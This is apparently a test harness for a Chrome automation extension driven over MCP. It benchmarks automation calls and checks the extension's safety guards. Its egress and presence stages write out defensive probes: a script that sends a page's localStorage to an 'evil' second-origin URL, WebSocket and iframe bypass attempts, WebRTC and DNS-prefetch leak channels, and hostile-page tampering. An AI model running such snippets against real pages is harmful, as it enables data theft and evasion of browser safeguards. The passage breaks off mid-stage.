// @ts-check
// real (standalone): the built vyre-chrome package, an MCP client, and a REAL Chrome with the REAL
// extension and native host, on a throwaway runner. It installs the connector the way a person
// would (cli.mjs install), talks to `cli.mjs mcp` over stdio like Claude Code, and measures:
//   per-call round trip through MCP, a 20-step batch as one call, a whole GoHighLevel-shaped flow
//   against the awkward fixture (slow route, popup, unsaved guard, toast, stale re-render), the
//   Esc halt of a running batch, the held-send path (chrome_send), the blind-page refusal, and
//   that the trace file exists and holds no secret. Never run this on a person's machine.
//
//   node standalone/harness/real.mjs [--iters 30] [--out file] [--chrome path] [--headless new|false]

// Chrome here is always launched through launchChrome (spike/harness/lib.mjs), which spreads CHROME_SAFE (lib/chrome-flags).
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { spawn, spawnSync } from "node:child_process";
import { fileURLToPath } from "node:url";
import { hostManifest, launchChrome, parseArgs, prepareExtension, registerHost, resolveChrome, sleep, stats, stepSummary, stopProcess } from "../../spike/harness/lib.mjs";
import { startFixtureServer } from "../../bench/fixtures/server.mjs";
import { WORKFLOW_STEPS, GHL_ROBUST, CHECKOUT_FIELDS } from "../../bench/scenarios.mjs";
import { build } from "../build-release.mjs";

const here = path.dirname(fileURLToPath(import.meta.url));
const T0 = performance.now();
const log = (/** @type {string} */ m) => console.error(`[standalone +${Math.round(performance.now() - T0)}ms] ${m}`);
/** @template T @param {Promise<T>} p @param {number} ms @param {string} what @returns {Promise<T>} */
const within = (p, ms, what) => new Promise((res, rej) => { const t = setTimeout(() => rej(new Error(`${what} took longer than ${ms} ms`)), ms); p.then(v => { clearTimeout(t); res(v); }, e => { clearTimeout(t); rej(e); }); });

/** What a failed batch or flow says, short but complete about the step that failed. @param {any} r */
const brief = r => { try { const last = Array.isArray(r.results) ? r.results[r.results.length - 1] : undefined; return JSON.stringify({ done: r.done, failedAt: r.failedAt, code: r.code, why: r.why, failed: r.failed, last }).slice(0, 1500); } catch { return String(r).slice(0, 500); } };

/** A minimal MCP client over a child's stdio. @param {import("node:child_process").ChildProcess} child */
function mcpClient(child) {
  let n = 0, calls = 0, buf = ""; const waiting = new Map();
  /** @type {any} */ const c = child;
  c.stdout.on("data", (/** @type {any} */ d) => { buf += d; let i; while ((i = buf.indexOf("\n")) >= 0) { const line = buf.slice(0, i); buf = buf.slice(i + 1); if (!line.trim()) continue; try { const m = JSON.parse(line); waiting.get(m.id)?.(m); } catch { /* not ours */ } } });
  const rpc = (/** @type {string} */ method, /** @type {any} */ params, ms = 60_000) => within(new Promise(res => { const id = ++n; waiting.set(id, res); c.stdin.write(JSON.stringify({ jsonrpc: "2.0", id, method, params }) + "\n"); }), ms, `mcp ${method}`);
  /** A tool call: the parsed JSON result, or throws with the tool's error text. */
  const call = async (/** @type {string} */ name, /** @type {any} */ args = {}, ms = 60_000) => {
    const n = ++calls, t = performance.now();
    if (n <= 40 || n % 50 === 0) log(`> #${n} ${name}`);
    const r = /** @type {any} */ (await rpc("tools/call", { name, arguments: args }, ms).catch(e => { log(`! #${n} ${name} ${e.message}`); throw e; }));
    if (n <= 40 || n % 50 === 0) log(`< #${n} ${name} ${Math.round(performance.now() - t)}ms${r.result && r.result.isError ? " (error)" : ""}`);
    if (r.error) throw new Error(`${name}: rpc ${r.error.code} ${r.error.message}`);
    const text = (r.result.content.find((/** @type {any} */ x) => x.type === "text") || {}).text || "null";
    if (r.result.isError) throw Object.assign(new Error(`${name}: ${text.slice(0, 500)}`), { text });
    try { return JSON.parse(text); } catch { return text; }
  };
  return { rpc, call };
}

async function main() {
  const args = parseArgs(process.argv.slice(2));
  const iters = Number(args.iters) || 30;
  const headless = args.headless === "false" ? false : typeof args.headless === "string" ? args.headless : "new";
  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), "vyre-sa-"));
  const udd = path.join(tmp, "profile"); fs.mkdirSync(udd);
  const data = path.join(tmp, "data");
  /** @type {Record<string, any>} */ const out = { tool: "chrome-standalone", os: `${process.platform}-${os.arch()}`, node: process.version, headless, stages: {}, at: new Date().toISOString() };
  setTimeout(() => {
    out.fatal = out.fatal || "watchdog: still running after 420 s";
    console.log(JSON.stringify(out, null, 2));
    if (typeof args.out === "string") { try { fs.mkdirSync(path.dirname(path.resolve(args.out)), { recursive: true }); fs.writeFileSync(args.out, JSON.stringify(out, null, 2)); } catch { /* best effort */ } }
    process.exit(3);
  }, 420_000).unref();
  /** @type {any} */ let chromeProc = null, fixture = null, mcp = null;
  const cleanups = /** @type {Array<()=>void>} */ ([]);
  const stage = async (/** @type {string} */ name, /** @type {()=>Promise<any>} */ fn) => {
    const t = performance.now(); log(`stage ${name}`);
    try { out.stages[name] = { ok: true, ...(await within(fn(), 120_000, `stage ${name}`)), ms: Math.round(performance.now() - t) }; log(`stage ${name} ok`); return true; }
    catch (e) { const m = String(/** @type {Error} */ (e).message || e); log(`stage ${name} FAILED: ${m.slice(0, 300)}`); out.stages[name] = { ok: false, error: m.slice(0, 600), ms: Math.round(performance.now() - t) }; return false; }
  };
  /** Time n runs of a call. @param {number} n @param {()=>Promise<any>} fn */
  const timed = async (n, fn) => { const xs = []; for (let i = 0; i < n; i++) { const t = performance.now(); await fn(); xs.push(performance.now() - t); } return stats(xs); };

  try {
    log("build the release");
    const rel = build({ out: path.join(tmp, "release") });
    out.release = { version: rel.version, sha256: rel.sha };
    const home = path.join(tmp, "home"); fs.mkdirSync(home);
    const env = { ...process.env, HOME: home, USERPROFILE: home, VYRE_CHROME_HOME: data };
    const cliInstall = path.join(rel.dir, "standalone", "cli.mjs");
    const app = path.join(data, "app");
    const cli = path.join(app, "standalone", "cli.mjs");
    log("cli install");
    const inst = spawnSync(process.execPath, [cliInstall, "install", "--browsers", "chrome"], { env, encoding: "utf8" });
    out.install = { status: inst.status, printedAddLine: /claude mcp add vyre-chrome/.test(inst.stdout || ""), stderr: (inst.stderr || "").slice(0, 300) };
    if (inst.status !== 0) throw new Error(`install failed: ${inst.stderr}`);
    const ext = prepareExtension(path.join(app, "extension"), path.join(tmp, "extension"));
    out.extensionId = ext.id;
    const launcher = path.join(app, "native-host", process.platform === "win32" ? "run-host.cmd" : "run-host.sh");
    cleanups.push(registerHost({ manifestObj: hostManifest({ wrapper: launcher, id: ext.id }), dir: tmp, userDataDir: udd }));

    fixture = await startFixtureServer();
    // This harness has no person to ask: a resume after the Esc stage must not wait for one.
    spawnSync(process.execPath, [cli, "config", "confirm-sends", "off"], { env, encoding: "utf8" });
    const child = spawn(process.execPath, [cli, "mcp"], { env, stdio: ["pipe", "pipe", "pipe"] });
    mcp = mcpClient(child);
    child.stderr.on("data", d => { const s = String(d).trim(); if (s) log(`mcp: ${s.slice(0, 200)}`); });
    cleanups.push(() => { try { child.kill(); } catch { /* gone */ } });
    await stage("mcp_initialize", async () => { const r = /** @type {any} */ (await mcp.rpc("initialize", { protocolVersion: "2025-06-18", capabilities: {}, clientInfo: { name: "harness", version: "1" } })); const l = /** @type {any} */ (await mcp.rpc("tools/list", {})); return { server: r.result.serverInfo, tools: l.result.tools.length }; });

    const chrome = resolveChrome({ chrome: typeof args.chrome === "string" ? args.chrome : undefined });
    out.chrome = chrome.version;
    const launched = launchChrome({ chrome: chrome.path, userDataDir: udd, url: `${fixture.url}/checkout`, extraArgs: [`--load-extension=${ext.dir}`, `--disable-extensions-except=${ext.dir}`], headless, logFile: path.join(tmp, "chrome.log") });
    chromeProc = launched.child; log("chrome launched");

    const connected = await stage("connected", async () => {
      const end = Date.now() + 45_000;
      for (;;) { const s = await mcp.call("chrome_status", {}); if (s.connected) return { extension: s.extension && { protocol: s.extension.protocol, version: s.extension.version } }; if (Date.now() > end) throw new Error("the extension never connected: " + JSON.stringify(s).slice(0, 300)); await sleep(250); }
    });
    if (connected) {
      /** @type {any} */ let tab;
      await stage("tabs_use", async () => { const r = await mcp.call("chrome_tabs", { action: "use", url: `${fixture.url}/checkout`, openIfMissing: true }); tab = r.id ?? (r.tab && r.tab.id); return { tab }; });
      await stage("snapshot", async () => { const s = await mcp.call("chrome_snapshot", { tab }); return { controls: (s.controls || []).length, ms: undefined, latency: await timed(iters, () => mcp.call("chrome_snapshot", { tab })) }; });
      await stage("fill_12", async () => ({ latency: await timed(iters, () => mcp.call("chrome_fill", { tab, fields: CHECKOUT_FIELDS.map(f => ({ selector: { identifier: f.selector.replace(/^#/, "") }, value: f.value })) })) }));
      await stage("click", async () => ({ latency: await timed(iters, () => mcp.call("chrome_act", { tab, selector: { identifier: "apply-promo" }, kind: "click" })) }));

      await stage("batch_20_one_call", async () => {
        const g = await mcp.call("chrome_tabs", { action: "use", url: `${fixture.url}/ghl`, openIfMissing: true }); const gt = g.id ?? (g.tab && g.tab.id);
        const steps = WORKFLOW_STEPS.map(s => s.op === "click"
          ? { op: "page.act", args: { tabId: gt, selector: { identifier: (/data-testid="([^"]+)"/.exec(s.selector) || [])[1] }, kind: "click" } }
          : { op: "page.fill", args: { tabId: gt, fields: [{ selector: { identifier: s.selector.replace(/^#/, "") }, value: s.value }] } });
        const batchMs = /** @type {number[]} */ ([]);
        for (let k = 0; k < 5; k++) {
          await mcp.call("chrome_tabs", { action: "navigate", tab: gt, url: `${fixture.url}/ghl` }); await sleep(200);
          const t = performance.now(); const r = await mcp.call("chrome_batch", { tab: gt, steps });
          if (r.ok === false) throw new Error("batch failed: " + brief(r));
          batchMs.push(performance.now() - t);
        }
        return { steps: steps.length, oneCall: stats(batchMs) };
      });

      await stage("ghl_robust_flow", async () => {
        const r = await mcp.call("chrome_tabs", { action: "use", url: `${fixture.url}${GHL_ROBUST.path}`, openIfMissing: true }); const gt = r.id ?? (r.tab && r.tab.id);
        await mcp.call("chrome_tabs", { action: "navigate", tab: gt, url: `${fixture.url}${GHL_ROBUST.path}` }); await sleep(300);
        const t0 = performance.now();
        await mcp.call("chrome_batch", { tab: gt, steps: GHL_ROBUST.before.map(s => ({ ...s, args: { ...s.args, tabId: gt } })) });
        const run = await mcp.call("chrome_ghl", { action: "run", tab: gt, flow: GHL_ROBUST.flow, params: GHL_ROBUST.params }, 90_000);
        const ms = Math.round(performance.now() - t0);
        const st = await mcp.call("chrome_eval", { tab: gt, expression: "JSON.stringify(window.__state)" });
        const state = JSON.parse(typeof st === "string" ? st : (st.value ?? st.result ?? "null"));
        const view = { ...state, steps: (state.steps || []).length };
        for (const [k, v] of Object.entries(GHL_ROBUST.expect.state)) if (JSON.stringify(/** @type {any} */ (view)[k]) !== JSON.stringify(v)) throw new Error(`state.${k} is ${JSON.stringify(/** @type {any} */ (view)[k])}, wanted ${JSON.stringify(v)}; run: ${brief(run)}`);
        return { ms, ok: run.ok !== false, state: { saved: state.saved, steps: (state.steps || []).length, trigger: state.trigger, whatsnewClosed: state.whatsnewClosed, discarded: state.discarded } };
      });

      await stage("esc_halts_batch", async () => {
        const g = await mcp.call("chrome_tabs", { action: "use", url: `${fixture.url}/ghl`, openIfMissing: true }); const gt = g.id ?? (g.tab && g.tab.id);
        await mcp.call("chrome_tabs", { action: "navigate", tab: gt, url: `${fixture.url}/ghl` }); await sleep(200);
        const one = WORKFLOW_STEPS.map(s => s.op === "click"
          ? { op: "page.act", args: { tabId: gt, selector: { identifier: (/data-testid="([^"]+)"/.exec(s.selector) || [])[1] }, kind: "click" } }
          : { op: "page.fill", args: { tabId: gt, fields: [{ selector: { identifier: s.selector.replace(/^#/, "") }, value: s.value }] } });
        const steps = [...one, ...one, ...one, ...one, ...one];
        const run = mcp.call("chrome_batch", { tab: gt, steps }, 60_000).then(r => ({ r }), e => ({ e }));
        await sleep(25);
        const t0 = performance.now();
        await mcp.call("chrome_stop", { by: "esc" });
        const res = /** @type {any} */ (await run);
        const haltMs = Math.round(performance.now() - t0);
        const r = res.r || {}; const code = r.code || (res.e && /stopped/.test(String(res.e.message)) ? "stopped" : "");
        await mcp.call("chrome_resume", { answer: "ok" }).catch(() => {});
        if (code !== "stopped") throw new Error("the batch was not halted by Esc: " + JSON.stringify(res).slice(0, 300));
        return { stopToBatchReturnMs: haltMs, extensionHaltMs: r.haltMs ?? null, doneBeforeStop: r.done ?? null, of: steps.length };
      });

      await stage("held_send", async () => {
        const c = await mcp.call("chrome_tabs", { action: "use", url: `${fixture.url}/checkout`, openIfMissing: true }); const ct = c.id ?? (c.tab && c.tab.id);
        await mcp.call("chrome_tabs", { action: "navigate", tab: ct, url: `${fixture.url}/checkout` }); await sleep(300);
        const h = await mcp.call("chrome_act", { tab: ct, selector: { identifier: "place-order" }, kind: "click" });
        if (!h.held || !h.id) throw new Error("the order button was not held: " + JSON.stringify(h).slice(0, 300));
        const sent = await mcp.call("chrome_send", { id: h.id });
        const again = await mcp.call("chrome_send", { id: h.id }).then(() => "sent twice", e => e.text ? "refused" : "refused");
        return { held: true, sentOk: sent && sent.ok !== false, secondSend: again };
      });

      await stage("egress_blocked", async () => {
        // A second fixture server is a second origin: a script that sends the page's storage there must be held.
        const other = await startFixtureServer();
        try {
          const r = await mcp.call("chrome_tabs", { action: "use", url: `${fixture.url}/checkout`, openIfMissing: true }); const et = r.id ?? (r.tab && r.tab.id);
          await mcp.call("chrome_tabs", { action: "navigate", tab: et, url: `${fixture.url}/checkout` }); await sleep(300);
          const evil = `${other.url}/collect?d=`;
          const held = await mcp.call("chrome_eval", { tab: et, expression: `(async () => { localStorage.setItem('k', 'v'); try { await fetch(${JSON.stringify(evil)} + encodeURIComponent(JSON.stringify(localStorage))); } catch (e) {} new Image().src = ${JSON.stringify(evil)} + 'img'; return 1; })()` });
          if (!held.held) throw new Error("a script sending storage to a second origin was not held: " + JSON.stringify(held).slice(0, 300));
          const own = await mcp.call("chrome_eval", { tab: et, expression: `fetch('/api/contacts?limit=1').then(r => r.status)` });
          if (own.held || own.ok === false) throw new Error("the page's own API call was refused: " + JSON.stringify(own).slice(0, 300));
          // Real WebSocket servers. The page is on 127.0.0.1, so "localhost" is a fresh domain (the browser-level rule works on
          // domains). Every chrome_eval here runs guarded (the module never lets a model lift it), so the CONTROL is a page load
          // that opens a socket by itself, with none of our scripts involved.
          const { createServer } = await import("node:http"); const { createHash } = await import("node:crypto");
          const mkWs = (/** @type {string} */ urlHost = "127.0.0.1") => new Promise(res => { const st = { upgrades: 0, bytes: 0, url: "", close: () => {} }; const srv = createServer((q, r) => r.end("ok"));
            srv.on("upgrade", (q, sock) => { st.upgrades++; const key = createHash("sha1").update(q.headers["sec-websocket-key"] + "258EAFA5-E914-47DA-95CA-C5AB0DC85B11").digest("base64"); sock.write(`HTTP/1.1 101 Switching Protocols\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Accept: ${key}\r\n\r\n`); sock.on("data", d => { st.bytes += d.length; }); sock.on("error", () => {}); });
            srv.listen(0, "127.0.0.1", () => { st.url = `ws://${urlHost}:${/** @type {any} */ (srv.address()).port}/`; st.close = () => srv.close(); res(st); }); });
          const wsA = await mkWs(), wsA2 = await mkWs(), wsB = await mkWs("localhost"), wsC = await mkWs("localhost"), wsD = await mkWs("localhost");
          const nav = async (/** @type {string} */ u) => { await mcp.call("chrome_tabs", { action: "navigate", tab: et, url: `${fixture.url}/wsprobe?u=${encodeURIComponent(u)}` }); for (let i = 0; i < 30; i++) { const st = await mcp.call("chrome_eval", { tab: et, expression: "window.__wsState" }).catch(() => ({})); if (st && st.value && st.value !== "connecting") return st.value; await sleep(100); } return "timeout"; };
          // Control 1: the fresh domain's server works (a page load opens a socket to it, no guard involved).
          const controlFresh = await nav(wsD.url);
          // Control 2: the page holds an open socket to A, opened by the page itself.
          const heldOpen = await nav(wsA.url);
          const bytesBefore = wsA.bytes;
          // Now every check below runs inside guarded scripts.
          const existing = await mcp.call("chrome_eval", { tab: et, expression: `(async () => { try { window.__ws.send('hello-from-existing-socket'); } catch (e) { return 'threw'; } await new Promise(r => setTimeout(r, 500)); return 'sent'; })()` }).catch(e => ({ error: String(e.message) }));
          const plain = await mcp.call("chrome_eval", { tab: et, expression: `(async () => { try { new WebSocket(${JSON.stringify(wsB.url)}); } catch (e) {} await new Promise(r => setTimeout(r, 700)); return 1; })()` }).catch(e => ({ error: String(e.message) }));
          const iframeBypass = await mcp.call("chrome_eval", { tab: et, expression: `(async () => { const f = document.createElement('iframe'); document.body.appendChild(f); try { new f.contentWindow.WebSocket(${JSON.stringify(wsC.url)}); } catch (e) {} await new Promise(r => setTimeout(r, 700)); return 1; })()` }).catch(e => ({ error: String(e.message) }));
          const knownDomain = await mcp.call("chrome_eval", { tab: et, expression: `(async () => { const f = document.createElement('iframe'); document.body.appendChild(f); try { new f.contentWindow.WebSocket(${JSON.stringify(wsA2.url)}); } catch (e) {} await new Promise(r => setTimeout(r, 700)); return 1; })()` }).catch(e => ({ error: String(e.message) }));
          await sleep(400);
          const websocketProof = {
            controlFreshDomainServerReachedByPageLoad: controlFresh === "open" && wsD.upgrades >= 1,
            pageHeldSocketOpened: heldOpen === "open",
            existingSocketBytesDuringGuard: wsA.bytes - bytesBefore, existingSocketUntouched: wsA.bytes - bytesBefore > 0,
            plainNewSocketToFreshDomain: wsB.upgrades === 0 ? "refused (server saw none)" : `NOT refused (${wsB.upgrades})`,
            iframeBypassToFreshDomain: wsC.upgrades === 0 ? "refused (server saw none)" : `NOT refused (${wsC.upgrades})`,
            newSocketToKnownDomainAllowed: wsA2.upgrades >= 1,
            plainHeldReport: plain && plain.held === true, existingResult: existing && (existing.value ?? existing.error),
          };
          wsA.close(); wsA2.close(); wsB.close(); wsC.close(); wsD.close();
          // Channels the Fetch domain does not see. Reported as they are: held or not, no claim beyond what this shows.
          const host = new URL(other.url).host;
          const probe = async (/** @type {string} */ name, /** @type {string} */ expression) => { try { const r = await mcp.call("chrome_eval", { tab: et, expression }); return { held: r.held === true, value: r.value, error: r.error }; } catch (e) { return { threw: String(/** @type {Error} */ (e).message).slice(0, 160) }; } };
          const channels = {
            websocket: await probe("websocket", `(() => { try { new WebSocket('ws://${host}/x'); } catch (e) {} return 1; })()`),
            webrtc: await probe("webrtc", `(() => { try { new RTCPeerConnection({ iceServers: [{ urls: 'stun:${host.replace(/:\d+$/, "")}:3478' }] }); } catch (e) {} return 1; })()`),
            dnsPrefetch: await probe("dns", `(() => { const l = document.createElement('link'); l.rel = 'dns-prefetch'; l.href = 'http://${host}/'; document.head.appendChild(l); return 1; })()`),
            preconnect: await probe("preconnect", `(() => { const l = document.createElement('link'); l.rel = 'preconnect'; l.href = 'http://${host}/'; document.head.append(l); return 1; })()`),
          };
          const wp = websocketProof;
          if (!wp.controlFreshDomainServerReachedByPageLoad) throw new Error("the WebSocket control failed (the fresh server was not reachable by a page load), so the refusals prove nothing: " + JSON.stringify(wp));
          if (!wp.pageHeldSocketOpened || !wp.existingSocketUntouched) throw new Error("the page's own open socket did not keep working during the guard: " + JSON.stringify(wp));
          if (wp.plainNewSocketToFreshDomain !== "refused (server saw none)" || wp.iframeBypassToFreshDomain !== "refused (server saw none)") throw new Error("a new WebSocket to a fresh domain was not refused: " + JSON.stringify(wp));
          if (!wp.newSocketToKnownDomainAllowed) throw new Error("a new socket to the page's own domain was refused: " + JSON.stringify(wp));
          return { heldOutside: true, ownOriginValue: own.value, websocketProof, channels };
        } finally { await other.close(); }
      });

      await stage("blind_refused", async () => {
        let msg = "";
        try { await mcp.call("chrome_tabs", { action: "open", url: "chrome://settings/passwords" }); } catch (e) { msg = String(/** @type {Error} */ (e).message); }
        if (!/blocked/.test(msg)) throw new Error(`expected blocked, got ${JSON.stringify(msg).slice(0, 200)}`);
        return { refused: true };
      });

      // A flow that worked becomes a recipe (what was typed turns into parameters) and replays as ONE call with the same guards.
      await stage("recipe_replay", async () => {
        const g = await mcp.call("chrome_tabs", { action: "use", url: `${fixture.url}/ghl`, openIfMissing: true }); const gt = g.id ?? (g.tab && g.tab.id);
        await mcp.call("chrome_tabs", { action: "navigate", tab: gt, url: `${fixture.url}/ghl` }); await sleep(300);
        const steps = WORKFLOW_STEPS.map(s => s.op === "click"
          ? { op: "page.act", args: { tabId: gt, selector: { identifier: (/data-testid="([^"]+)"/.exec(s.selector) || [])[1] }, kind: "click" } }
          : { op: "page.fill", args: { tabId: gt, fields: [{ selector: { identifier: s.selector.replace(/^#/, "") }, value: s.value }] } });
        const t0 = performance.now();
        const first = await mcp.call("chrome_batch", { tab: gt, steps, saveAs: "make-workflow" });
        const firstMs = Math.round(performance.now() - t0);
        if (first.ok === false || !first.recipe) throw new Error("the batch did not leave a recipe: " + JSON.stringify(first).slice(0, 300));
        const typed = WORKFLOW_STEPS.filter(s => s.op !== "click").map(s => String(s.value));
        const list = await mcp.call("chrome_recipe", { action: "list", tab: gt });
        if (!list.recipes || !list.recipes.some((/** @type {any} */ r) => r.name === "make-workflow")) throw new Error("the recipe is not listed: " + JSON.stringify(list).slice(0, 300));
        if (typed.some(v => v.length > 2 && JSON.stringify(list).includes(v))) throw new Error("a typed value is in the recipe listing");
        await mcp.call("chrome_tabs", { action: "navigate", tab: gt, url: `${fixture.url}/ghl` }); await sleep(300);
        const params = Object.fromEntries(first.recipe.params.map((/** @type {string} */ n) => [n, `Replay ${n}`]));
        const t1 = performance.now();
        const run = await mcp.call("chrome_recipe", { action: "run", tab: gt, name: "make-workflow", params }, 60_000);
        const replayMs = Math.round(performance.now() - t1);
        if (run.ok === false || run.done !== steps.length) throw new Error("the replay did not do every step: " + JSON.stringify(run).slice(0, 400));
        return { steps: steps.length, params: first.recipe.params.length, firstMs, replayMs, oneCall: true };
      });

      // A script cannot write with the page's login by submitting a form either.
      await stage("eval_form_submit_refused", async () => {
        const c = await mcp.call("chrome_tabs", { action: "use", url: `${fixture.url}/checkout?form=1`, openIfMissing: true }); const ct = c.id ?? (c.tab && c.tab.id);
        await mcp.call("chrome_tabs", { action: "navigate", tab: ct, url: `${fixture.url}/checkout?form=1` }); await sleep(300);
        let err = /** @type {any} */ (null);
        let got = /** @type {any} */ (null);
        try { got = await mcp.call("chrome_eval", { tab: ct, expression: "(() => { const f = document.querySelector('form'); f.method = 'post'; f.action = '/api/form-probe'; f.requestSubmit(); return 'submitted'; })()" }); } catch (e) { err = e; }
        if (!err || !/POST/.test(String(err.message))) throw new Error("a script's form submit was not refused: err=" + String(err && err.message).slice(0, 200) + " result=" + JSON.stringify(got).slice(0, 300));
        const r2 = await mcp.call("chrome_tabs", { action: "presence", tab: ct });
        return { refused: String(err.message).slice(0, 120), pageStillAt: r2 && r2.pill !== undefined };
      });

      // What the person sees: Vyre's tab is in a group named Vyre, the badge run is on, a pill is in the page (hidden from snapshots), and the pill's Stop stops the run.
      await stage("presence", async () => {
        await mcp.call("chrome_summary", {}); // end whatever an earlier stage left open (a held send nobody answered still owns the badge)
        // A tab Vyre OPENS joins the group (a tab the person already had is left alone), so open a new one on another origin: localhost, not 127.0.0.1.
        const p0 = await mcp.call("chrome_tabs", { action: "open", url: `${fixture.url.replace("127.0.0.1", "localhost")}/checkout?presence=1` }); const pt = p0.id ?? (p0.tab && p0.tab.id);
        await sleep(400);
        await mcp.call("chrome_act", { tab: pt, selector: { identifier: "apply-promo" }, kind: "click" });
        let st = /** @type {any} */ ({});
        for (let i = 0; i < 20; i++) { st = await mcp.call("chrome_tabs", { action: "presence", tab: pt }); if (st.pill) break; await sleep(250); }
        if (!st.active) throw new Error("the run is not showing as active: " + JSON.stringify(st));
        if (!/^Step \d+/.test(st.label || "") || !/Esc to stop/.test(st.label || "")) throw new Error("the pill label is " + JSON.stringify(st.label));
        if (!st.group || st.group.title !== "Vyre" || st.group.color !== "grey") throw new Error("the tab is not in a grey group titled Vyre: " + JSON.stringify(st.group));
        if (!st.pill) throw new Error("no pill in the page");
        const snap = await mcp.call("chrome_snapshot", { tab: pt });
        if (/vyre-pill|Esc to stop|Step \d+ of/i.test(JSON.stringify(snap))) throw new Error("the snapshot shows the pill");
        // A hostile page: it tries to stop the run, to reach Vyre's state, to show its own words in the pill and to swallow Esc. None of it may work.
        if (st.exposedToPage && (st.exposedToPage.vyreStop || st.exposedToPage.vyreLogin || st.exposedToPage.pillState)) throw new Error("the page can see Vyre's bindings or state: " + JSON.stringify(st.exposedToPage));
        await mcp.call("chrome_eval", { tab: pt, expression: "(() => { let r = []; try { window.vyreStop('pill'); r.push('stop-called'); } catch (e) { r.push('no-stop'); } try { window.__vyrePill.set('hacked'); r.push('set-called'); } catch (e) { r.push('no-set'); } document.addEventListener('keydown', e => e.stopImmediatePropagation(), true); return r.join(','); })()", asked: true }).catch(() => {});
        const still = await mcp.call("chrome_act", { tab: pt, selector: { identifier: "apply-promo" }, kind: "click" });
        if (still.ok === false) throw new Error("a page calling vyreStop stopped the run: " + JSON.stringify(still).slice(0, 200));
        const after = await mcp.call("chrome_tabs", { action: "presence", tab: pt });
        if (/hacked/.test(JSON.stringify(after)) || !/Step \d+/.test(after.label || "")) throw new Error("the page changed what the pill says: " + JSON.stringify(after).slice(0, 200));
        // The pill's own Stop button, pressed with a real click, halts the run (even with a page listener swallowing keys).
        const pressed = await mcp.call("chrome_tabs", { action: "presence", tab: pt, press: "Pause" });
        if (!pressed.pressed) throw new Error("no Pause button in the pill to press: " + JSON.stringify(pressed).slice(0, 200));
        let halted = false;
        for (let i = 0; i < 20 && !halted; i++) { try { await mcp.call("chrome_act", { tab: pt, selector: { identifier: "apply-promo" }, kind: "click" }); } catch (e) { halted = /stop/i.test(String(e && /** @type {any} */ (e).message || e)); } if (!halted) await sleep(150); }
        await mcp.call("chrome_resume", { answer: "ok" }).catch(() => {});
        if (!halted) throw new Error("the pill's Pause button did not halt the run");
        return { label: st.label, group: st.group, pill: st.pill, exposedToPage: st.exposedToPage, haltedByPill: halted };
      });

      // Approve once, write many: without a plan a write made with the page's login is held; with one the person approved, that many go through and the next asks again.
      await stage("plan_approval", async () => {
        const g = await mcp.call("chrome_tabs", { action: "use", url: `${fixture.url}/ghl`, openIfMissing: true }); const gt = g.id ?? (g.tab && g.tab.id);
        await mcp.call("chrome_tabs", { action: "navigate", tab: gt, url: `${fixture.url}/ghl` }); await sleep(300);
        await mcp.call("chrome_api", { action: "learn", tab: gt });
        const steps = WORKFLOW_STEPS.map(s => s.op === "click"
          ? { op: "page.act", args: { tabId: gt, selector: { identifier: (/data-testid="([^"]+)"/.exec(s.selector) || [])[1] }, kind: "click" } }
          : { op: "page.fill", args: { tabId: gt, fields: [{ selector: { identifier: s.selector.replace(/^#/, "") }, value: s.value }] } });
        await mcp.call("chrome_batch", { tab: gt, steps });
        const cat = await mcp.call("chrome_api", { action: "learn", tab: gt });
        const entry = (cat.entries || []).find((/** @type {any} */ e) => e.method === "POST" && /\/api\/workflows/.test(e.pathTemplate || e.path || ""));
        if (!entry) throw new Error("the catalog has no POST /api/workflows entry: " + JSON.stringify((cat.entries || []).map((/** @type {any} */ e) => e.method + " " + (e.pathTemplate || e.path))).slice(0, 300));
        const write = (/** @type {string} */ name) => mcp.call("chrome_api", { action: "call", tab: gt, entry: entry.id, args: { body: { name } } });
        const h0 = await write("plan probe 0");
        if (!h0.held || !h0.id) throw new Error("a write with no plan was not held: " + JSON.stringify(h0).slice(0, 300));
        const p = await mcp.call("chrome_approve", { tab: gt, title: "Two draft workflows", items: [{ kind: "create", what: "draft workflow", count: 2 }] });
        if (!p.held || !p.id) throw new Error("the plan was not held for the person: " + JSON.stringify(p).slice(0, 300));
        const ok = await mcp.call("chrome_send", { id: p.id });
        if (!ok.approved) throw new Error("approving the plan did not start it: " + JSON.stringify(ok).slice(0, 300));
        const a = await write("plan probe 1"); const b = await write("plan probe 2"); const c = await write("plan probe 3");
        if (a.held || b.held || (a.status !== 201 && a.status !== 200)) throw new Error("the two covered writes did not go through: " + JSON.stringify({ a, b }).slice(0, 400));
        if (!c.held) throw new Error("the third write, beyond the plan, was not held: " + JSON.stringify(c).slice(0, 300));
        // The finish: a summary in words, and the same as a card in the page the run worked in.
        const sum = await mcp.call("chrome_summary", {});
        if (!sum.counts || sum.counts.create !== 2 || !Array.isArray(sum.lines) || !/2 created/.test(sum.lines[0])) throw new Error("the summary is wrong: " + JSON.stringify(sum).slice(0, 400));
        let card = false;
        for (let i = 0; i < 20 && !card; i++) { const r = await mcp.call("chrome_eval", { tab: gt, expression: "!!document.querySelector('vyre-card')" }); card = (r.value ?? r.result) === true; if (!card) await sleep(250); }
        if (!card) throw new Error("no finish card in the page");
        const snap = await mcp.call("chrome_snapshot", { tab: gt });
        if (/vyre-card|Vyre finished|Dismiss/.test(JSON.stringify(snap))) throw new Error("the snapshot shows the finish card");
        return { entry: entry.id, unplanned: "held", covered: [a.status, b.status], beyondPlan: "held", summary: sum.lines[0], card };
      });

      // The sign-in handoff: a step on a login page answers login_required, the tab comes to the front, and Vyre carries on once the person is in.
      await stage("login_handoff", async () => {
        const l = await mcp.call("chrome_tabs", { action: "use", url: `${fixture.url}/login`, openIfMissing: true }); const lt = l.id ?? (l.tab && l.tab.id);
        await mcp.call("chrome_tabs", { action: "navigate", tab: lt, url: `${fixture.url}/login` });
        let err = /** @type {any} */ (null);
        try { await mcp.call("chrome_act", { tab: lt, selector: { identifier: "apply-promo" }, kind: "click", wait: { timeoutMs: 500 } }); } catch (e) { err = e; }
        const msg = String(err && /** @type {any} */ (err).message || "");
        if (!/login_required|sign in/i.test(msg)) throw new Error("a step on a login page did not answer login_required: " + msg.slice(0, 300));
        const chk = await mcp.call("chrome_login", { action: "check", tab: lt });
        if (!chk.wall || chk.kind !== "password" || !chk.waitingForPerson) throw new Error("the login check says " + JSON.stringify(chk));
        const list = await mcp.call("chrome_tabs", { action: "list" });
        const mine = (list.tabs || []).find((/** @type {any} */ t) => t.id === lt);
        if (mine && mine.active === false) throw new Error("the login tab was not brought to the front");
        // The person signs in (here: the harness plays them and moves the tab on), and the wait ends by itself.
